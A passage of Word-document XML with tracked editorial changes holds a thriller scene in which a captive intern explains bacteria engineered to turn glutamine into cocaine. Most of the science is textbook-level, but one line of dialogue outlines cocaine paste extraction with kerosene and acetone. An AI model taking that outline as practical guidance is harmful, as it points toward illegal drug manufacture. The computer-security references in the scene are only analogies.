        </w:rPr>
        <w:t xml:space="preserve"> glass bottle of clear liquid</w:t>
      </w:r>
      <w:del w:id="2074" w:author="TextVet" w:date="2016-03-22T10:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A72645">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, sealed with a stopper</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He reached for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wouldn’t touch that if I were you,” Julie called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is it?”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“Hydrochloric acid, eleven molar concentration. I told you idiots you only need three molar to stabilize the base. I’ll have to dilute the shit out of it.” She sighed. “Whatever. Go ahead, open it. I don’t care.”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whispered, “We’re not with the Russians, Julie. We’re here to bust you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gave no indication of having heard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“Don’t you want to get out of here?” he pressed.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Julie’s lip trembled. “I want…” she looked up at the windows of the overhead office and screamed, “…my </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fucking blow</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">!” She grabbed a nearby piece of cardboard and threw </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>it weakly upwards. “They fucking stole it! It’s mine, God damn it! Fuck…!” She sniffled, wiped her nose with her sleeve, and mumbled, “Your friend is gonna burn his hands off, by the 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largely ignoring the conversation, was jabbing at the bottle with his HERF gun, transfixed by the liquid jiggling back and forth. It looked like ordinary water, except for the fine white haze suspended above its surface.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shuffled toward him. Without a word, she picked up a nearby pair of gloves and goggles, put them on, and gently pulled out the stopper. A translucent trail of pale vapor wafted upward. She grabbed a scrap of cardboard from the floor and passed it over the bottle, through the finger of fog. Along the line of exposure, the cardboard blackened and charred. She gave the sheet a slight shake, and chunks crumbled to ash. She used the remains of the cardboard to wipe the stopper. Where it touched, the cardboard simply vanished. She re</w:t>
      </w:r>
      <w:del w:id="2075" w:author="TextVet" w:date="2016-03-22T10:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003C2473">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sealed the bottle and removed her safety gear. “</w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2076" w:author="TextVet" w:date="2016-03-22T10:14:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">That’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>why you don’t fuck with this stuff.”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reached into his pocket. “Julie, listen. We brought you something…” He drew out the Eppendorf vial and extended it toward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head</w:t>
      </w:r>
      <w:ins w:id="2077" w:author="TextVet" w:date="2016-03-22T10:15:00Z">
        <w:r w:rsidR="00D023D3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> and eyebrows</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> lifted high</w:t>
      </w:r>
      <w:del w:id="2078" w:author="TextVet" w:date="2016-03-22T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D023D3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> at the sight of it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “The mother strain!” She grabbed </w:t>
      </w:r>
      <w:del w:id="2079" w:author="TextVet" w:date="2016-03-22T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E17F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">it </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and held it</w:t>
      </w:r>
      <w:ins w:id="2080" w:author="TextVet" w:date="2016-03-22T10:16:00Z">
        <w:r w:rsidR="006E17F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, inspecting</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2081" w:author="TextVet" w:date="2016-03-22T10:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E17F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2082" w:author="TextVet" w:date="2016-03-22T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E17F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>up to her face</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “It’s biofilming. That’s good. It’s supposed to. This is…!” Her eyes darted up toward the office. Her expression quickly soured again. “You shouldn’t have brought it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you incubate it?”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second I finish a batch, the Russians will put a bullet through my head.”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might be able to talk them into letting you go.”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“Fat chance.”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worth a try,”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frowned. “Can you get me some blow?”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“Tell me what’s in the vial,” said Jason, “and I’ll see what I can do.”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 cocaine factory,” she said simply.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looked around the room. “Yeah, I gathered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Julie held up the vial. “No, this.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is a cocaine factory.” She pointed across the room, toward a pyramidal stack of large plastic jars labeled “L-Glutamine”. “You feed that stuff to these bacteria, and they poop out benzoylmethylecgonine.”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“Benzowhat?”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“Benzoylmethylecgonine. Cocaine. The world’s best targeted dopamine reuptake inhibitor.”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eyed the purple labels on the jars. “That L-Glutamine stuff… Is it hard to get?”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looked at Jason with an expression usually directed at the kid in class who eats paste. “It’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>glutamine</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. It’s forty bucks a pound at any GNC store.”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you incubate the germs in that vial, then you pour in that glutamine stuff, and then suddenly you have cocaine?”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“More or less,” said Julie. “You have to give it time to let the enzymes act, but after that you can process it just like leaves from a coca plant. Mix it with kerosene, grind it into a paste, separate with acetone, blah blahblah. The process does kill the bacteria, so you need to keep a pure mother broth around. But basically, yeah.”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“Wait, let me get this straight,” Danny said. “This whole night, I’ve been chasing after some kind of germ that’s been injected with the gene for cocaine?”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Julie rolled her eyes. “There is no ‘gene for cocaine’. Cocaine </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2083" w:author="TextVet" w:date="2016-03-22T10:19:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>isn’t</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a protein. It’s a crystalline tropane </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2084" w:author="TextVet" w:date="2016-03-22T10:19:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>alkaloid</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Do you have any idea how complicated its biosynthesis process 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“Umm… no?” Danny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“Look, cellular machinery can’t create cocaine directly through gene expression. But it </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> create enzymes to catalyze precursors. That’s what happens in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erythroxylon coca</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> — the coca plant. Unlike cocaine, enzymes </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> proteins. Enzymes </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> have genetic encodings. Which meeeeeans…” She paused, hoping that the implication would be obvious. The two men stared at her blankly. “…Which </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>means</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> that we can sequence those genes in the coca plant, and then splice them into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So the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thinks they’re part of its own genome, and translates them into proteins. Got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brightly. “Yeah!”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Julie cocked an eyebrow. “Really?”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Danny declared. “It’s just like a DLL hijacking attack! How a lot of computer viruses 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stared at her quizzically. “You gene-spliced a coca plant into a laboratory germ to create a cocaine-producing bio-machine? That sounds like one hell of an engineering accomplishment.”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“Recombinant genetics isn’t for sissies,” she replied proudly.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Jason asked, “how much of this genetic engineering did you perform on your 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do you mean?” Julie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did you get that vial?” Jason prodded.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told you!” Julie said defiantly. “By sequencing the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erythroxylon coca</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> genome…”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answers how </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tungsten</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> created it,” said Jason. “It doesn’t answer how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ended up with it. Look, I don’t know much about science, but I do know about personnel management. The kind of engineering effort you’re describing would take years, even for a team of world-class researchers. You did not create it on your own as some intern summer project.”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couldn’t have finished it without me!” she protested.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“Right. They needed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to sequence the coca plant genome. They needed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to splice the genes into the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strain…”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glared at him. “I’m a key member of the research staff!”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“You’re a college sophomore.”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balled her small fists and </w:t>
      </w:r>
      <w:ins w:id="2085" w:author="TextVet" w:date="2016-03-22T10:22:00Z">
        <w:r w:rsidR="00C917BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>growled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2086" w:author="TextVet" w:date="2016-03-22T10:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C917BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>roared furiously</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> through clenched teeth. “God, </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2087" w:author="TextVet" w:date="2016-03-22T10:23:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>shut</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2088" w:author="TextVet" w:date="2016-03-22T10:23:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>fuck</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> up! You don’t understand!” She stormed to her mattress and sat down in a huff. “Just leave me alone!”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Jason took a deep breath, and calmly watched her for a few silent moments. Danny stepped toward her </w:t>
      </w:r>
      <w:ins w:id="2089" w:author="TextVet" w:date="2016-03-22T10:24:00Z">
        <w:r w:rsidR="004476F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>unsure</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2090" w:author="TextVet" w:date="2016-03-22T10:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004476F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>awkward</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ly</w:t>
      </w:r>
      <w:ins w:id="2091" w:author="TextVet" w:date="2016-03-22T10:24:00Z">
        <w:r w:rsidR="004476F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2092" w:author="TextVet" w:date="2016-03-22T10:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004476F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, but</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Jason stopped him with a simple raise of his</w:t>
      </w:r>
      <w:del w:id="2093" w:author="TextVet" w:date="2016-03-22T10:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004476F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> open</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> palm. Finally, Jason slowly approached Julie’s mattress, sat down beside her, and asked her with a gentle, soothing voice, “Tell me what happened.”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She picked idly at a loose thread. “Creating cocaine-producing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wasn’t just some side-project. It’s the whole point of Tungsten. This vial is everything they’ve been working for.”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they entrusted it to their intern?”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Genetic engineering isn’t an exact science. It’s not like we can reach inside a cell’s nucleus with little tweezers, you know? We use special chemicals called restriction enzymes to chop out the genes we want from the source organism. But a lot of other unwanted chunks of DNA also float out along with it. You then have to fool a bacterium into absorbing these chunks into its own genome. It’s tricky because bacteria have evolved restriction modification systems to protect themselves from foreign DNA…”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“Ooh!” Danny interrupted. “Like Intrusion Prevention Systems on computer networks! I just learned about those today.”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blinked at him and shrugged. “Anyway. To fool a bacterium into adopting foreign DNA, you have to wrap the new gene into a plasmid, or load it into a bacteriophage virus, and so on. Oh, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you have to create some way to separate the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that </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> absorb your new gene from the ones that don’t. Like with something called a ‘screenable marker’, which is where we add a gene for bioluminescence to make organisms glow in the dark. Because, don’t forget, we don’t actually </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>see</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> what we’re working with — all we’re doing is mixing liquids and keeping our fingers crossed.”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what you’re saying,” said Jason, “is that you can do everything right, and in the end your germs don’t absorb any new DNA. Or they do, but it wasn’t the specific gene you were hoping for. Which means you have to mix up another batch and try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“Over and over,” said Julie. “And that’s just for </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
